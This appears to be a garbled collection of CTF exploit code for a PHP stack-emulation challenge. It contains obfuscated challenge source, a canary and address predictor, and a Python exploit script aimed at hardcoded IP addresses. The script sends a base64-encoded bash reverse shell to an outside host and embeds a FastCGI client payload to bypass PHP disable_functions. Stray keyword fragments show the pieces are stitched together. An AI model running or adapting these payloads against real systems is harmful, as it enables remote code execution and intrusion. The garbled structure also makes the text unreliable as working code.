                $this->{pop}('eax');
                $O0O0OO = $this->{get_data_from_reg}('eax');
                array_push($O0O00O, $_REQUEST[$O0O0OO]);
            }
            call_user_func_array($plt[$O00OOO], $O0O00O);
        } else {
            call_user_func($plt[$O00OOO]);
        }
    }
    public function push($O0OO0O)
    {
        global $regs;
        $O0OOO0 = $regs[$O0OO0O];
        if (hex2bin(strrev($O0OOO0)) == NULL) die('data error');
        $this->stack[$this->esp] = $O0OOO0;
        $this->esp -= 4;
    }
    public function pop($OO0000)
    {
        global $regs;
        $regs[$OO0000] = $this->stack[$this->esp];
        $this->esp += 4;
    }
    public function __call($OO000O, $OO00O0)
    {
        check_canary();
    }
}
class_alias('O0OO0', stack, 0);
print_R('O0OO0');
print_R(stack);
if (isset($_POST['data'])) {
    $phpinfo_addr = array_search(phpinfo, $plt);
    $gets = $_POST['data'];
php
call_user_func_array
create_functionfastcgibypass disable_functionhttps://balsn.tw/ctf_writeup/20190323-
0ctf_tctf2019quals/#ghost-pepper
payload:
    $main_stack = new stack($phpinfo_addr, $gets);
    echo '--------------------output---------------------';
    $main_stack->{outputdata}();
    echo '------------------phpinfo()------------------';
    $main_stack->{ret}();
}
?>
     &$value) {
            $value = strrev(bin2hex($value));
        }
        return $data_list;
    }
    function gen_canary()
    {
        $OOOO = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQEST123456789';
        $O0000 = $OOOO[rand(0, strlen($OOOO) - 1)];
        $O000O = $OOOO[rand(0, strlen($OOOO) - 1)];
        $O00O0 = $OOOO[rand(0, strlen($OOOO) - 1)];
        $O00OO = "\x00";
        return $O0000 . $O000O . $O00O0 . $O00OO;
    }
    srand($argv[1]);
    $ins_offset = rand(0, 0xffff);
    $canary = gen_canary();
    $ebp = 0xfffe0000 + rand(0, 65535);
    rand(0, 65535);
    $esp_length = rand(0x20, 0x60) * 4;
    print($esp_length . PHP_EOL);
    print($canary.PHP_EOL);
    $system_addr = 479 + $ins_offset + 1610612736 + 1;
    $assert_addr = $system_addr + 401;
    $print_r_addr = $system_addr + 110;
    $call_func_addr = $system_addr + 101;
    // print("system address: ".dechex($system_addr).PHP_EOL);
    print(strrev(dechex($call_func_addr)).PHP_EOL);
    print($call_func_addr.PHP_EOL);
    ?>
import subprocess
import requests
import time, sys
url = "http://192.168.111.138:8080/"
url = "http://34.85.27.91:10080/"
rand = int(time.time())
cmd = "php getrand.php %d"%(rand)
proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
result = proc.stdout.read()
result = result.split(b"\n")
stack_length = int(result[0])
canary = result[1]
print_r = bytes.fromhex(result[2].decode())
print_r_int = result[3]
cmd = sys.argv[1]
cmd = 'echo "YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xMzMuMTMwLjEyMi4yMzMvOTk5NyAwPiYxCg=="|base64 -d|bash'
payload = """class Response
{
    const REQ_STATE_WRITTEN    = 1;
    const REQ_STATE_OK         = 2;
    const REQ_STATE_ERR        = 3;
    const REQ_STATE_TIMED_OUT  = 4;
    public $state;
    public $stdout;
    public $stderr;
    private $reqID;
    private $resp;
    private $conn;
    public function __construct(Client $conn, $reqID)
    {
        $this->reqID = $reqID;
        $this->conn = $conn;
    }
    public function getId()
    {
        return $this->reqID;
    }
    public function get($timeout = 0)
    {
        if ($this->resp === null) {
            if ($this->state == self::REQ_STATE_OK
                || $this->state == self::REQ_STATE_ERR
            ) {
                return $this->resp;
            }
            $this->conn->waitForResponse($this->reqID, $timeout);
            $this->resp = self::formatResponse($this->stdout, $this->stderr);
        }
        return $this->resp;
    }
    private static function formatResponse($stdout, $stderr)
    {
        $code     = 200;
        $headers  = [
            'status' => '200 OK',
        ];
        $boundary = strpos($stdout, "\r\n\r\n");
        if (false !== $boundary) {
            $rawHead = substr($stdout, 0, $boundary);
            $stdout = substr($stdout, $boundary + 4);
            $headerLines = explode("\n", $rawHead);
            foreach ($headerLines as $line) {
                if (preg_match('/([\w-]+):\s*(.*)$/', $line, $matches)) {
                    $headerName  = strtolower($matches[1]);
                    $headerValue = trim($matches[2]);
                    if ($headerName === 'status') {
                        $headers['status'] = $headerValue;
                        $pos  = strpos($headerValue, ' ') ;
                        $code = $pos > 0
                            ? (int) substr($headerValue, 0, $pos)
                            : (int) $headerValue;
                        continue;
                    }
                    if (array_key_exists($headerName, $headers)) {
                        if (!is_array($headers[$headerName])) {
                            $headers[$headerName] = [ $headers[$headerName] ];
                        }
                        $headers[$headerName][] = $headerValue;
                    } else {
                        $headers[$headerName] = $headerValue;
                    }
                }
            }
        }
        return array(
            'statusCode' => $code,
            'headers'    => $headers,
            'body'       => $stdout,
            'stderr'     => $stderr,
        );
    }
}
class Client
{
    const VERSION_1            = 1;
    const BEGIN_REQUEST        = 1;
    const ABORT_REQUEST        = 2;
    const END_REQUEST          = 3;
    const PARAMS               = 4;
    const STDIN                = 5;
    const STDOUT               = 6;
    const STDERR               = 7;
    const DATA                 = 8;
    const GET_VALUES           = 9;
    const GET_VALUES_RESULT    = 10;
    const UNKNOWN_TYPE         = 11;
    const RESPONDER            = 1;
    const AUTHORIZER           = 2;
    const FILTER               = 3;
    const REQUEST_COMPLETE     = 0;
    const CANT_MPX_CONN        = 1;
    const OVERLOADED           = 2;
    const UNKNOWN_ROLE         = 3;
    const HEADER_LEN           = 8;
    protected $sock;
    protected $host;
    protected $port;
    protected $keepAlive = false;
    protected $_requests = array();
    protected $_requestCounter = 0;
    protected $_readWriteTimeout = 0;
    public function __construct($host, $port = null)
    {
        $this->host = $host;
        $this->port = $port;
    }
    public function __destruct()
    {
        $this->close();
    }
    public function __sleep()
    {
        return array('host','port','_readWriteTimeout');
    }
    public function setKeepAlive($b)
    {
        $this->keepAlive = (boolean)$b;
        if (!$this->keepAlive && $this->sock) {
            $this->close();
        }
    }
    public function getKeepAlive()
    {
        return $this->keepAlive;
    }
    public function close()
    {
        if ($this->sock) {
            socket_close($this->sock);
            $this->sock = null;
        }
        $this->_requests = [];
    }
    public function setReadWriteTimeout($timeoutMs)
    {
        $this->_readWriteTimeout = $timeoutMs;
        $this->setMsTimeout($this->_readWriteTimeout);
    }
    public function getReadWriteTimeout()
    {
        return $this->_readWriteTimeout;
    }
    private function setMsTimeout($timeoutMs) {
        if (!$this->sock) {
            return false;
        }
        $timeout = array(
            'sec' => floor($timeoutMs / 1000),
            'usec' => ($timeoutMs % 1000) * 1000,
        );
        return socket_set_option($this->sock, SOL_SOCKET, SO_RCVTIMEO, $timeout);
    }
    protected function connect()
    {
        if ($this->sock) {
            return;
        }
        if ($this->port) {
            $this->sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
            $address = $this->host;
            $port = $this->port;
        } else {
            $this->sock = socket_create(AF_UNIX, SOCK_STREAM, 0);
            $address = $this->host;
            $port = 0;
        }
        if (!$this->sock) {
            throw CommunicationException::socketCreate();
        }
        if (false === socket_connect($this->sock, $address, $port)) {
            throw CommunicationException::socketConnect($this->sock, $this->host, $this->port);
        }
        if ($this->_readWriteTimeout && !$this->setMsTimeout($this->_readWriteTimeout)) {
            throw new CommunicationException('Unable to set timeout on socket');
        }
    }
    protected function buildPacket($type, $content, $requestId = 1)
    {
        $offset = 0;
        $totLen = strlen($content);
        $buf    = '';
        do {
            $part = substr($content, $offset, 0xffff - 8);
            $segLen = strlen($part);
            $buf .= chr(self::VERSION_1)        
                . chr($type)                    
                . chr(($requestId >> 8) & 0xFF) 
                . chr($requestId & 0xFF)        
                . chr(($segLen >> 8) & 0xFF)    
                . chr($segLen & 0xFF)        